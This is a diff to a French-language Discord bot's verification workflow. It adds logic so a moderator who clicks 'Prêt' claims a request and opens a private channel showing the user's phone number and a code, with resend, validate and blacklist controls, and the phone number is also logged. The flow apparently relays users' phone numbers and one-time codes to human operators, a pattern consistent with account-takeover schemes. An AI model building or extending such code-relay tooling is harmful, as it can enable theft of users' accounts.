@@ -1071,6 +1071,10 @@ client.on("interactionCreate", async (i) => {
       await i.reply({ content: "Demande expirée ou déjà traitée.", flags: MessageFlags.Ephemeral });
       return;
     }
+    if (data.claimedBy && data.claimedBy !== i.user.id) {
+      await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
+      return;
+    }
     const isTg = originGuildId === "tg";
     const guildName = isTg ? "Telegram" : (await client.guilds.fetch(originGuildId).catch(()=>({name:"le serveur"}))).name;
     const niceMsg = `✅ **Bonne nouvelle !**\n\nUn modérateur est enfin disponible pour votre vérification sur **${guildName}**.\nMerci de patienter, il va prendre en charge votre demande dans quelques instants et vous guider pour finaliser votre vérification.\n\nRestez à l'écoute !`;
@@ -1081,22 +1085,75 @@ client.on("interactionCreate", async (i) => {
         const u = await client.users.fetch(userId);
         await u.send(niceMsg);
       }
-      await i.reply({ content: `✅ Utilisateur <@${userId}> notifié qu'un modérateur est prêt.`, flags: MessageFlags.Ephemeral });
     } catch (e) {
-      await i.reply({ content: `❌ Erreur envoi DM: ${e.message}`, flags: MessageFlags.Ephemeral });
-      return;
+      console.error("pret DM fail:", e.message);
     }
-    // restaure le bouton Claim pour que le modo puisse claim
+    // claim direct + création salon privé pour celui qui a cliqué Prêt
+    data.claimedBy = i.user.id;
+    pending.set(key, data);
     try {
-      const ch = await client.channels.fetch(data.modChannelId);
-      const msg = await ch.messages.fetch(data.modMessageId);
-      const embed = msg.embeds[0];
-      const newEmbed = EmbedBuilder.from(embed).setColor(0x57f287).setDescription((embed.description || "") + `\n\n✅ **Prêt** par <@${i.user.id}> — utilisateur notifié`);
-      const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId(`claim_${originGuildId}_${userId}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
+      const modChannel = await client.channels.fetch(data.modChannelId);
+      const modMsg = await modChannel.messages.fetch(data.modMessageId);
+      const og = isTg ? null : await client.guilds.fetch(originGuildId).catch(() => null);
+      let claimedEmbed = null;
+      if (isTg) {
+        claimedEmbed = new EmbedBuilder().setTitle(`${data.tgName || "Telegram"}`).setDescription(`Telegram · \`${userId}\`\n\nClaim par <@${i.user.id}> (Prêt)`).setColor(0x57f287);
+      } else {
+        let present = true;
+        try { if (og) await og.members.fetch(userId); } catch { present = false; }
+        claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
+      }
+      await modMsg.edit({ embeds: [claimedEmbed], components: [] });
+      const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
+      const claimerId = i.user.id;
+      const newChannel = await modGuild.channels.create({
+        name: `verif-${userId}`,
+        type: ChannelType.GuildText,
+        parent: modChannel.parentId || null,
+        permissionOverwrites: [
+          { id: modGuild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+          { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
+          { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
+        ],
+        reason: `Prêt ${i.user.tag} ${userId}`
+      });
+      const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
+      const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
+      const row1 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
+        new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
+        new ButtonBuilder().setCustomId(`mod_msg_${originGuildId}_${userId}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
+        new ButtonBuilder().setCustomId(`mod_reject_${originGuildId}_${userId}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
       );
-      await msg.edit({ embeds: [newEmbed], components: [row] });
-    } catch {}
+      const row2 = new ActionRowBuilder().addComponents(
+        new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuildId}_${userId}`).setPlaceholder("⚙️ Actions staff...").addOptions(
+          { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
+          { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
+          { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
+          { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
+          { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
+        )
+      );
+      const row3 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`close_${originGuildId}_${userId}`).setLabel("Supprimer le salon").setStyle(ButtonStyle.Danger).setEmoji("🗑️")
+      );
+      const detailMsg = await newChannel.send({ content: `<@${claimerId}>`, embeds: [detailEmbed], components: [row1, row2, row3] });
+      data.threadId = newChannel.id;
+      data.detailMessageId = detailMsg.id;
+      pending.set(key, data);
+      sendClaimLog({
+        claimerId: i.user.id,
+        claimedUserId: userId,
+        claimedUserTag: targetUser.username || targetUser.tag || "",
+        phone: data.phone,
+        originGuild: og || { name: isTg ? "Telegram" : "Serveur", id: originGuildId },
+        tgName: data.tgName
+      }).catch(()=>{});
+      await i.reply({ content: `✅ Prêt — ${newChannel} créé et utilisateur notifié.`, flags: MessageFlags.Ephemeral });
+    } catch (e) {
+      console.error("pret claim fail:", e);
+      await i.reply({ content: `Erreur Prêt: ${e.message}`, flags: MessageFlags.Ephemeral });
+    }
     return;
   }
   if (i.isButton() && (i.customId.startsWith("code_ok_") || i.customId.startsWith("code_bad_"))) {
